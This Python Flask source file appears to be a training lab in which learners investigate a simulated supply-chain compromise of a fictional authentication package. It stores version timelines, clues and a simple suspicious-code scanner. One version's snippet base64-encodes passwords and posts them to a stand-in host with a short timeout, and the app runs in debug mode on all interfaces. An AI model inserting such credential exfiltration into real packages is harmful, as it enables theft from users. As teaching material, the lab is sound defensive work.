from flask import Flask, render_template, request, jsonify
from datetime import datetime

app = Flask(__name__)
app.config['SECRET_KEY'] = 'your-secret-key-here'

# Simulated package timeline and compromise story
COMPROMISE_TIMELINE = {
    "package_name": "secure-auth-helper",
    "versions": [
        {
            "version": "1.0.0",
            "date": "2023-01-15",
            "maintainer": "john_developer",
            "status": "legitimate",
            "code_snippet": "def authenticate(user, password):\n    return verify_credentials(user, password)",
            "downloads": 50000,
            "issues": 2,
            "commits": 15,
            "maintainer_email": "john@legitcompany.com",
            "description": "Secure authentication helper library"
        },
        {
            "version": "1.1.0",
            "date": "2023-03-20",
            "maintainer": "john_developer",
            "status": "legitimate",
            "code_snippet": "def authenticate(user, password):\n    return verify_credentials(user, password)\n\ndef hash_token(token):\n    return hashlib.sha256(token.encode()).hexdigest()",
            "downloads": 125000,
            "issues": 5,
            "commits": 8,
            "maintainer_email": "john@legitcompany.com",
            "description": "Secure authentication helper library"
        },
        {
            "version": "2.0.0",
            "date": "2023-09-05",
            "maintainer": "alex_maintainer",
            "status": "suspicious",
            "code_snippet": "def authenticate(user, password):\n    result = verify_credentials(user, password)\n    # New analytics feature\n    send_analytics(user, result)\n    return result\n\ndef send_analytics(user, result):\n    import requests\n    requests.post('https://analytics.example.com/track', json={'user': user, 'result': result})\n    return True",
            "downloads": 500000,
            "issues": 45,
            "commits": 3,
            "maintainer_email": "alex@newdomain.com",
            "description": "Secure authentication helper library - now with analytics!",
            "warning": "Maintainer changed, new analytics feature added"
        },
        {
            "version": "2.1.0",
            "date": "2023-11-18",
            "maintainer": "alex_maintainer",
            "status": "compromised",
            "code_snippet": "def authenticate(user, password):\n    result = verify_credentials(user, password)\n    # Analytics and logging\n    send_data_to_server(user, password, result)\n    return result\n\ndef send_data_to_server(user, password, result):\n    import requests, base64\n    data = {'u': user, 'p': base64.b64encode(password.encode()).decode(), 'r': result}\n    requests.post('https://malicious-exfil.com/collect', json=data, timeout=0.1)\n    return True",
            "downloads": 850000,
            "issues": 127,
            "commits": 1,
            "maintainer_email": "alex@newdomain.com",
            "description": "Secure authentication helper library",
            "warning": " CRITICAL: Credentials being exfiltrated to external server!"
        }
    ]
}

# Simulated compromised data
COMPROMISED_DATA = {
    "credentials_stolen": 125000,
    "data_exfiltrated_to": "https://malicious-exfil.com/collect",
    "compromise_detected": False
}

# Investigation clues
INVESTIGATION_CLUES = [
    {
        "id": "maintainer_change",
        "title": "Maintainer Change",
        "description": "The package maintainer changed from 'john_developer' to 'alex_maintainer' in version 2.0.0",
        "severity": "medium",
        "found": False
    },
    {
        "id": "email_domain",
        "title": "Suspicious Email Domain",
        "description": "New maintainer uses email 'alex@newdomain.com' - different from original 'john@legitcompany.com'",
        "severity": "medium",
        "found": False
    },
    {
        "id": "external_server",
        "title": "External Data Transmission",
        "description": "Code sends data to 'malicious-exfil.com' - not the original company domain",
        "severity": "critical",
        "found": False
    },
    {
        "id": "issue_spike",
        "title": "Issue Spike",
        "description": "Number of GitHub issues jumped from 3 to 127 between versions 1.2.0 and 2.1.0",
        "severity": "high",
        "found": False
    }
]

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/lab")
def lab():
    return render_template("lab.html")

@app.route("/api/timeline")
def get_timeline():
    """Get the package version timeline"""
    return jsonify({
        "package": COMPROMISE_TIMELINE["package_name"],
        "timeline": COMPROMISE_TIMELINE["versions"],
        "total_versions": len(COMPROMISE_TIMELINE["versions"])
    })

@app.route("/api/version/<version>")
def get_version_details(version):
    """Get details of a specific version"""
    version_data = next((v for v in COMPROMISE_TIMELINE["versions"] if v["version"] == version), None)
    if version_data:
        return jsonify(version_data)
    return jsonify({"error": "Version not found"}), 404

@app.route("/api/compare", methods=["POST"])
def compare_versions():
    """Compare two versions side by side"""
    data = request.get_json()
    v1 = data.get("version1")
    v2 = data.get("version2")
    
    version1 = next((v for v in COMPROMISE_TIMELINE["versions"] if v["version"] == v1), None)
    version2 = next((v for v in COMPROMISE_TIMELINE["versions"] if v["version"] == v2), None)
    
    if not version1 or not version2:
        return jsonify({"error": "One or both versions not found"}), 404
    
    return jsonify({
        "version1": version1,
        "version2": version2,
        "differences": {
            "maintainer_changed": version1["maintainer"] != version2["maintainer"],
            "downloads_change": version2["downloads"] - version1["downloads"],
            "issues_change": version2["issues"] - version1["issues"],
            "code_changed": version1["code_snippet"] != version2["code_snippet"]
        }
    })

@app.route("/api/investigation/clues")
def get_clues():
    """Get investigation clues"""
    return jsonify({
        "clues": INVESTIGATION_CLUES,
        "found_count": sum(1 for clue in INVESTIGATION_CLUES if clue["found"]),
        "total_count": len(INVESTIGATION_CLUES)
    })

@app.route("/api/investigation/mark-found", methods=["POST"])
def mark_clue_found():
    """Mark a clue as found"""
    data = request.get_json()
    clue_id = data.get("clue_id")
    
    for clue in INVESTIGATION_CLUES:
        if clue["id"] == clue_id:
            clue["found"] = True
            return jsonify({"success": True, "clue": clue})
    
    return jsonify({"error": "Clue not found"}), 404

@app.route("/api/impact")
def get_impact():
    """Get the impact of the compromise"""
    return jsonify({
        "credentials_stolen": COMPROMISED_DATA["credentials_stolen"],
        "data_exfiltrated_to": COMPROMISED_DATA["data_exfiltrated_to"],
        "packages_affected": "secure-auth-helper >= 2.0.0",
        "organizations_affected": "500+",
        "compromise_date": "2023-09-05",
        "detection_date": datetime.now().strftime("%Y-%m-%d")
    })

@app.route("/api/scan", methods=["POST"])
def scan_code():
    """Scan code for suspicious patterns"""
    data = request.get_json()
    code = data.get("code", "")
    
    suspicious_patterns = []
    
    if "requests.post" in code or "requests.get" in code:
        if "exfil" in code.lower() or "collect" in code.lower():
            suspicious_patterns.append({
                "pattern": "External data transmission",
                "severity": "high",
                "description": "Code makes HTTP requests to external servers"
            })
    
    if "base64" in code and "password" in code.lower():
        suspicious_patterns.append({
            "pattern": "Password encoding/transmission",
            "severity": "critical",
            "description": "Password is being encoded and potentially transmitted"
        })
    
    if "timeout=0.1" in code or "timeout=0" in code:
        suspicious_patterns.append({
            "pattern": "Short timeout to hide network activity",
            "severity": "medium",
            "description": "Very short timeout may indicate attempt to hide network requests"
        })
    
    return jsonify({
        "suspicious_patterns": suspicious_patterns,
        "total_found": len(suspicious_patterns)
    })

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5022, debug=True)